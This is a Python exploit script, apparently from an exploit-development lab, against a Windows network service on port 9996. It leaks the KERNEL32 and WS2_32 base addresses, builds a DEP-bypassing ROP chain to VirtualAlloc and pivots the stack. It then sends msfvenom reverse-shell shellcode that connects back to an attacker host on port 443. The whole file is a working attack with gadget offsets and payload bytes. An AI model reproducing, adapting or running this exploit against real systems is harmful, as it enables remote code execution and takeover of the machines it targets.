#!/usr/bin/python3

from struct import pack
import pwn
import sys

pwn.context.log_level = "WARNING"

# for RemoteApp4.exe; TCPView => listens on port 9996
SERVER, PORT = None, 9996

def main() :
    global SERVER ; SERVER = sys.argv[1]
    kernel32, ws2_32 = leakKernel32(), leakWs232()
    exploit(kernel32, ws2_32)


def leakKernel32():
    opcode = getOpcode(function=2) ; libname = b"KERNEL32.DLL"
    buf  = opcode + libname
    addr = parseAddress(sendPayload(wrapPayload(buf)), libname)
    print(f"[+] Leaked address of {libname}: 0x{addr:x}")
    return addr

def leakWs232():
    opcode = getOpcode(function=1) ; libname = b"WS2_32.DLL"
    buf  = opcode + libname
    addr = parseAddress(sendPayload(wrapPayload(buf)), libname)
    print(f"[+] Leaked address of {libname}: 0x{addr:x}")
    return addr

def wrapPayload(payload):
    """Pass checks / restrictions on input"""
    # note: there are no bad chars
    buf  = b""
    buf += pack("<I", 0x12345678)
    buf += pack("<I", 0xDEADB33F)
    buf += pack("<I", 0x20202020)
    buf += pack("<I", 0x5A3FD0FA)
    buf += pack("<I", 0xB8D2C0B3)
    buf += pack("<I", 0xE7A9BEEF)
    buf += pack("<I", 0x12F8D0C0)
    buf += pack("<I", 0x9C71CAFE)
    buf += pack("<I", 0x3BEAC0D3)
    buf += pack("<I", 0x6F50DEAD)
    buf += pack("<I", 0xDAB2FFFF)
    buf += pack("<I", 0x87C4A2B2)
    buf += pack("<I", 0xF503C2DD)
    buf += payload
    return buf

def getOpcode(function):
    shiftOpcode = 0xc7c
    return pack("<i", function - 1 - shiftOpcode)

def sendPayload(buf):
    p = pwn.remote(SERVER, PORT)
    p.recvuntil(b"Type something").decode()
    p.send(buf)
    output = p.recvall(timeout=1)
    p.close()
    return output

def parseAddress(buf, libname):
    return int(buf.split(libname + b": ")[1].split(b" ")[0], 16)

size = 0x4000 ; offBufEip = 0x7a4+4
def exploit(kernel32, ws2_32):
    # arbitrary splits for structure of the input buffer
    offBufShellcode        = offBufEip - 0x400
    offBufVirtualallocstub = offBufEip - len(virtualAllocStub())

    badchars = b"\x00\x01\x0a\x0b\x0c\x0e\x0f\xa1\xaa\xb1\xbb\xc1\xcc\xd1"
    # buf += bytes([ b for b in range(0x100)
    #                  if b not in badchars])

    buf  = b""
    buf += getOpcode(function=5)

    buf += nopsledRop(kernel32, 0x20)
    buf += ropChainVirtualAlloc(kernel32, ws2_32)

    tmpPaddingSize1 = offBufShellcode - len(buf)
    assert tmpPaddingSize1 >= 0
    buf += b"a" * tmpPaddingSize1

    buf += nopsled()
    buf += shellcode()

    tmpPaddingSize2 = offBufVirtualallocstub - len(buf)
    assert tmpPaddingSize2 >= 0
    buf += b"b" * tmpPaddingSize2

    buf += virtualAllocStub(kernel32)

    buf += ropChainBackJump(kernel32)                   # saved EIP is overwritten here

    buf += b"z" * (size - len(buf))

    assert len(buf) == size
    for b in badchars: assert b not in buf, print(f"{repr(chr(b))} 0x{b:x}\n", pwn.hexdump(buf))
    sendPayload(wrapPayload(buf))
    print("[+] Sent exploit; reverse shell should be incoming")

def virtualAllocStub(kernel32=0):
    offKernel32Virtualalloc = 0x238c0
    buf  = b""
    buf += pack("<I", kernel32+offKernel32Virtualalloc) # Address of VirtualAlloc
    buf += b"BBBB"                                      # Return address (shellcode address on stack)
    buf += b"CCCC"                                      # lpAddress (shellcode address on stack)
    buf += b"DDDD"                                      # dwSize (a page should be enough)
    buf += b"EEEE"                                      # flAllocationType (0x1000=MEM_COMMIT)
    buf += b"FFFF"                                      # flProtect (0x40=PAGE_EXECUTE_READWRITE)
    return buf

def ropChainBackJump(kernel32=0):
    buf  = b""
    buf += pack("<I", kernel32 + 0x6fa2f)               # push esp ; pop esi ; ret
    buf += pack("<I", kernel32 + 0x68090)               # mov eax, esi ; pop esi
    buf += b"jjjj"                                      # junk
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<i", -(offBufEip - 0x10))
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x6db79)               # xchg eax, esp
    return buf

def ropChainVirtualAlloc(kernel32=0, ws2_32=0):
    tmp1 = 0x77777777                                   # tmp value for arithmetic for avoiding badchars

    buf  = b""

    # align ecx with shellcode address
    offEaxShellcode = -0x414
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<i", offEaxShellcode)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x19a3d)               # mov ecx, eax ; mov eax, ecx ; pop ebp
    buf += b"jjjj"                                      # junk

    # align eax with return address of VirtualAlloc on stack
    offEaxRetaddrslot = 0x3e4
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<I", offEaxRetaddrslot+tmp1)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<i", -tmp1)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp

    # patch return address on stack
    buf += ropPatchEaxEcx(kernel32, ws2_32)

    # align eax with lpAddress on stack
    buf += pack("<I", kernel32 + 0xee5f) * 4            # inc eax

    # patch lpAddress on stack
    buf += ropPatchEaxEcx(kernel32, ws2_32)

    # align eax with dwSize on stack
    buf += pack("<I", kernel32 + 0xee5f) * 4            # inc eax

    # patch dwSize on stack
    PAGESIZE = 0x1000
    buf += ropBackupEax(kernel32, ws2_32)
    buf += pack("<I", ws2_32 + 0x455c5)                 # pop eax
    buf += pack("<I", PAGESIZE+tmp1)
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<i", -tmp1)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x19a3d)               # mov ecx, eax ; mov eax, ecx ; pop ebp
    buf += b"jjjj"                                      # junk
    buf += ropRestoreEax(kernel32, ws2_32)

    buf += ropPatchEaxEcx(kernel32, ws2_32)

    # align eax with flAllocationType on stack
    buf += pack("<I", kernel32 + 0xee5f) * 4            # inc eax

    # patch flAllocationType on stack
    MEM_COMMIT = 0x1000
    buf += ropBackupEax(kernel32, ws2_32)
    buf += pack("<I", ws2_32 + 0x455c5)                 # pop eax
    buf += pack("<I", MEM_COMMIT+tmp1)
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<i", -tmp1)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x19a3d)               # mov ecx, eax ; mov eax, ecx ; pop ebp
    buf += b"jjjj"                                      # junk
    buf += ropRestoreEax(kernel32, ws2_32)

    buf += ropPatchEaxEcx(kernel32, ws2_32)

    # align eax with flProtect on stack
    buf += pack("<I", kernel32 + 0xee5f) * 4            # inc eax

    # patch flProtect on stack
    PAGE_EXECUTE_READWRITE = 0x40
    buf += ropBackupEax(kernel32, ws2_32)
    buf += pack("<I", ws2_32 + 0x455c5)                 # pop eax
    buf += pack("<I", PAGE_EXECUTE_READWRITE+tmp1)
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<i", -tmp1)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x19a3d)               # mov ecx, eax ; mov eax, ecx ; pop ebp
    buf += b"jjjj"                                      # junk
    buf += ropRestoreEax(kernel32, ws2_32)

    buf += ropPatchEaxEcx(kernel32, ws2_32)

    # align eax with call to VirtualAlloc
    offEaxVirtualallocstub = -(len(virtualAllocStub()) - 4)
    buf += pack("<I", kernel32 + 0x742ae)               # pop ebp
    buf += pack("<i", offEaxVirtualallocstub)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp

    # buf += pack("<I", kernel32 + 0x6ff91)             # int3 (debug gadget)
    # buf += pack("<I", ws2_32 + 0xffe1)                # ret (nop; used only once in the ROP chain for setting breakpoints)

    # 0:003> dds @eax L6
    # 012feea8  775438c0 KERNEL32!VirtualAllocStub
    # 012feeac  012feac8
    # 012feeb0  012feac8
    # 012feeb4  00001000
    # 012feeb8  00001000
    # 012feebc  00000040
    # 0:003> db poi(@eax+4) L8
    # 012feac8  90 90 90 90 90 90 90 90

    # actually stack pivot
    buf += pack("<I", kernel32 + 0x6db79)               # xchg eax, esp

    return buf

def nopsled(length=0x10):
    return b"\x90" * length

def nopsledRop(kernel32, length=0x10):
    return pack("<I", kernel32 + 0xfe7b) * length       # ret

def ropPatchEaxEcx(kernel32, ws2_32):
    buf  = b""

    buf += ropBackupEax(kernel32, ws2_32)               # needed because gadget for patching modifies EAX

    buf += pack("<I", kernel32 + 0x723e6)               # mov  [eax], ecx ; xor eax, eax ; inc eax ; pop ebp ; retn 0x001C
    buf += b"jjjj"                                      # junk (ebp)
    buf += pack("<I", kernel32 + 0xfe7b)                # ret (= nop)
    buf += b"j" * 0x1c                                  # junk (retn)

    buf += ropRestoreEax(kernel32, ws2_32)

    return buf

def ropBackupEax(kernel32, ws2_32):
    """Backup EAX to EDX without modifying ECX"""
    buf  = b""
    buf += pack("<I", ws2_32 + 0x45d10)                 # xchg eax, esi
    buf += pack("<I", ws2_32 + 0x37052)                 # mov edx, esi ; mov eax, edx ; pop esi ; pop ebp ; retn 0x0004
    buf += b"jjjj" * 2                                  # junk
    buf += pack("<I", kernel32 + 0xfe7b)                # ret (= nop)
    buf += b"j" * 4                                     # junk (ret)
    return buf

def ropRestoreEax(kernel32, ws2_32):
    """Restore EAX from EDX without modifying ECX"""
    buf  = b""
    buf += pack("<I", ws2_32 + 0x315ad)                 # mov eax, edx ; pop esi
    buf += b"jjjj"                                      # junk
    return buf

def shellcode():
    buf  = b""
    # buf += b"\xcc\x90\x90\x90"                        # int3 / debugging

    buf += b"\x81\xc4\xfc\xfb\xff\xff\x90\x90"          # pwn.asm("add esp, -0x404; nop ; nop")
                                                        # make space for decoder (offset determined empirically)

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.232 LPORT=443 -f python -b "\x00\x01\x0a\x0b\x0c\x0e\x0f\xa1\xaa\xb1\xbb\xc1\xcc\xd1"
    # nc -vlnp 443
    buf += b"\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
    buf += b"\x13\x38\x1b\xe6\x15\x83\xeb\xfc\xe2\xf4\xc4\xf3"
    buf += b"\x64\x15\x38\x1b\x86\x9c\xdd\x2a\x26\x71\xb3\x4b"
    buf += b"\xd6\x9e\x6a\x17\x6d\x47\x2c\x90\x94\x3d\x37\xac"
    buf += b"\xac\x33\x09\xe4\x4a\x29\x59\x67\xe4\x39\x18\xda"
    buf += b"\x29\x18\x39\xdc\x04\xe7\x6a\x4c\x6d\x47\x28\x90"
    buf += b"\xac\x29\xb3\x57\xf7\x6d\xdb\x53\xe7\xc4\x69\x90"
    buf += b"\xbf\x35\x39\xc8\x6d\x5c\x20\xf8\xdc\x5c\xb3\x2f"
    buf += b"\x6d\x14\xee\x2a\x19\xb9\xf9\xd4\xeb\x14\xff\x23"
    buf += b"\x06\x60\xce\x18\x9b\xed\x03\x66\xc2\x60\xdc\x43"
    buf += b"\x6d\x4d\x1c\x1a\x35\x73\xb3\x17\xad\x9e\x60\x07"
    buf += b"\xe7\xc6\xb3\x1f\x6d\x14\xe8\x92\xa2\x31\x1c\x40"
    buf += b"\xbd\x74\x61\x41\xb7\xea\xd8\x44\xb9\x4f\xb3\x09"
    buf += b"\x0d\x98\x65\x73\xd5\x27\x38\x1b\x8e\x62\x4b\x29"
    buf += b"\xb9\x41\x50\x57\x91\x33\x3f\xe4\x33\xad\xa8\x1a"
    buf += b"\xe6\x15\x11\xdf\xb2\x45\x50\x32\x66\x7e\x38\xe4"
    buf += b"\x33\x45\x68\x4b\xb6\x55\x68\x5b\xb6\x7d\xd2\x14"
    buf += b"\x39\xf5\xc7\xce\x71\x7f\x3d\x73\x26\xbd\x15\xf3"
    buf += b"\x8e\x17\x38\x1a\x5d\x9c\xde\x71\xf6\x43\x6f\x73"
    buf += b"\x7f\xb0\x4c\x7a\x19\xc0\xbd\xdb\x92\x19\xc7\x55"
    buf += b"\xee\x60\xd4\x73\x16\xa0\x9a\x4d\x19\xc0\x50\x78"
    buf += b"\x8b\x71\x38\x92\x05\x42\x6f\x4c\xd7\xe3\x52\x09"
    buf += b"\xbf\x43\xda\xe6\x80\xd2\x7c\x3f\xda\x14\x39\x96"
    buf += b"\xa2\x31\x28\xdd\xe6\x51\x6c\x4b\xb0\x43\x6e\x5d"
    buf += b"\xb0\x5b\x6e\x4d\xb5\x43\x50\x62\x2a\x2a\xbe\xe4"
    buf += b"\x33\x9c\xd8\x55\xb0\x53\xc7\x2b\x8e\x1d\xbf\x06"
    buf += b"\x86\xea\xed\xa0\x16\xa0\x9a\x4d\x8e\xb3\xad\xa6"
    buf += b"\x7b\xea\xed\x27\xe0\x69\x32\x9b\x1d\xf5\x4d\x1e"
    buf += b"\x5d\x52\x2b\x69\x89\x7f\x38\x48\x19\xc0"

    return buf


if __name__ == "__main__":
    main()
